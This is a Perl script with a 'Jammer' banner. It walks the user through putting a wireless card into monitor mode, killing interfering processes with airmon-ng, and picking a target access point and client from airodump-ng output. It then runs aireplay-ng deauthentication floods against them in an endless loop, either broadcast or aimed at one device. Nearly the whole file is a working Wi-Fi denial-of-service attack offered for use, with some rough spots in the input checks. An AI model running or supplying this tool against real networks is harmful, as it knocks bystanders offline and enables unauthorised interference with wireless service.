#!/usr/bin/perl
use strict;
use warnings;

sub checkInterfaces
{
  my @InfoInterfaces = (0);
  foreach(split(/\n/,`ls /sys/class/net`))
  {
    if(`\`iwconfig $_ mode monitor  > /dev/null 2>&1\`\nif [ \$? -ne 0 ]\nthen\necho 1\nelse\necho 0\nfi` == 0) # See if the interface is capable of monitor mode
    {
      `iwconfig $_ mode managed`; # Return to managed mode
      push(@InfoInterfaces, $_);
      $InfoInterfaces[0]++;
    }
  }
  if($InfoInterfaces[0] <= 0)
  {
    return 0;
  }
  return @InfoInterfaces;
}

sub noInterfaces
{
  print("\n\nNo interface capable of monitor mode found. Plug in one and try again.\n\n"); # COLOR RED
  print("[1] - Retry\n[2] - Exit\n\n"); # COLOR GREEN
  print("==> "); # COLOR YELLOW
  my $userInput = <STDIN>;
  chomp($userInput);
  until ($userInput eq "1" or $userInput eq "2")
  {
    print("\nInvalid input, retry\n"); # COLOR RED
    print("==> "); # COLOR YELLOW
    $userInput = <STDIN>;
    chomp($userInput);
  }
  if ($userInput eq "1")
  {
    return checkInterfaces;
  }
  else
  {
    print("Exit\n");
    exit(0);
  }
}

sub chooseInterface
{
 my @InfoInterfaces = @{$_[0]};
 print("Choose the interface you want to use:\n\n"); # COLOR GREEN
 for(my $i = 1 ; $i < @InfoInterfaces ; $i++)
 {
   print("[$i] - $InfoInterfaces[$i]\n\n"); # COLOR BLUE
 }
 my $a = int($InfoInterfaces[0])+1;
 print("[$a] - Research new interface(s)\n\n"); # COLOR
 my $i = 0;
 my $userInput;
 do
 {
   print("==> "); # Color YELLOW
   $userInput = <STDIN>;
   if($userInput =~ /^[+-]?\d+$/)
   {
     if($userInput >= 1 and $userInput <= $a)
     {
       $i = 1;
     }
   }
   if($i == 0)
   {
     print("Invalid input, retry\n");
   }
 }until($i == 1);
 if($userInput == $a)
 {
   print("RETRY\n"); #TODO
   exit(1);
 }
 else{
   `iwconfig $InfoInterfaces[$userInput] mode monitor`; # Set in monitor mode the interface
    return $InfoInterfaces[$userInput];
 }
}

sub scanner
{
  my ($interface) = @_;
  `airmon-ng check kill`;
  print("\n\nPlease identify your target and close xterm\n");
  `xterm -title "Scan" -geometry '120x20+1300+0' -hold -e airodump-ng $interface`; #TODO open xterm
  print("What is the targeted access point ?\n\n");
  print("==> "); # COLOR YELLOW
  my $userInput = <STDIN>;
  chomp($userInput);
  until($userInput =~ /([0-9A-F]{2}([:-]|$)){6}/)
  {
    print("Invalid BSSID, retry\n");
    print("==> "); #COLOR YELLOW
    $userInput = <STDIN>;
    chomp($userInput);
  }
  my $station = $userInput;
  print("\n\nWhat is the target inside the network ? Press 'Enter' to use broadcast\n\n");
  print("==> "); #COLOR YELLOW
  $userInput = <STDIN>;
  until($userInput =~ /([0-9A-F]{2}([:-]|$)){6}/ or $userInput = "\n")
  {
    print("Invalid input, retry\n");
    print("$userInput\n");
    print("==> "); #COLOR YELLOW
    $userInput = <STDIN>;
    chomp($userInput);
  }
  if($userInput eq "\n")
  {
    print("The attack is launch in broadcast, press <CTRL+C> to stop\n");
    while() # TODO Mettre dans Thread
    {
      `aireplay-ng $interface -a $station -c FF:FF:FF:FF:FF:FF -0 1000`;
    }
  }
  my $target = $userInput;
  print("The attack is launch, press <CTRL+C> to stop\n");
  print("aireplay-ng $interface -a $station -c $target -0 1000");
  while()
  {
    `aireplay-ng $interface -a $station -c $target -0 1000`;
  }


}

# BANNER IN COLOR
print("
     ____.
    |    |____    _____   _____   ___________
    |    \\__  \\  /     \\ /     \\_/ __ \\_  __ \\
/\\__|    |/ __ \\|  Y Y  \\  Y Y  \\  ___/|  | \\/
\\________(____  /__|_|  /__|_|  /\\___  >__|
              \\/      \\/      \\/     \\/       \n\n\n");

my @InfoInterfaces = checkInterfaces;
while ($InfoInterfaces[0] <= 0)
{
  @InfoInterfaces = noInterfaces;
}

my $interface = chooseInterface(\@InfoInterfaces);
scanner($interface);
